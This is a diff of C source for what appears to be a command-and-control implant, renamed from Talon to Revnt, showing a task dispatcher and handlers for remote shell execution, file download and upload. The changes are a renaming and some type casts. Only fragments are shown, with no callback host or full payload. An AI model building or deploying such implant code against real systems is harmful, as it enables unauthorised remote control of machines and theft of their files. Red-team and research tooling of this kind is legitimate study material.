@@ -1,12 +1,12 @@
-#include <Talon.h>
+#include <Revnt.h>
 
 #include <Command.h>
 #include <Package.h>
 #include <Core.h>
 
-#define TALON_COMMAND_LENGTH 5
+#define REVNT_COMMAND_LENGTH 5
 
-TALON_COMMAND Commands[ TALON_COMMAND_LENGTH ] = {
+REVNT_COMMAND Commands[ REVNT_COMMAND_LENGTH ] = {
         { .ID = COMMAND_SHELL,            .Function = CommandShell },
         { .ID = COMMAND_DOWNLOAD,         .Function = CommandDownload },
         { .ID = COMMAND_UPLOAD,           .Function = CommandUpload },
@@ -49,7 +49,7 @@ VOID CommandDispatcher()
                     printf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );
 
                     BOOL FoundCommand = FALSE;
-                    for ( UINT32 FunctionCounter = 0; FunctionCounter < TALON_COMMAND_LENGTH; FunctionCounter++ )
+                    for ( UINT32 FunctionCounter = 0; FunctionCounter < REVNT_COMMAND_LENGTH; FunctionCounter++ )
                     {
                         if ( Commands[ FunctionCounter ].ID == TaskCommand )
                         {
@@ -99,7 +99,7 @@ VOID CommandShell( PPARSER Parser )
     SECURITY_ATTRIBUTES SecurityAttr    = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
     STARTUPINFOA        StartUpInfoA    = { };
 
-    Command = ParserGetBytes( Parser, &Length );
+    Command = ParserGetBytes(Parser, (PUINT32) &Length);
 
     if ( CreatePipe( &hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0 ) == FALSE )
     {
@@ -179,7 +179,7 @@ VOID CommandDownload( PPARSER Parser )
     DWORD    FileSize = 0;
     DWORD    Read     = 0;
     DWORD    NameSize = 0;
-    PCHAR    FileName = ParserGetBytes( Parser, &NameSize );
+    PCHAR    FileName = ParserGetBytes(Parser, (PUINT32) &NameSize);
     HANDLE   hFile    = NULL;
     PVOID    Content  = NULL;
 
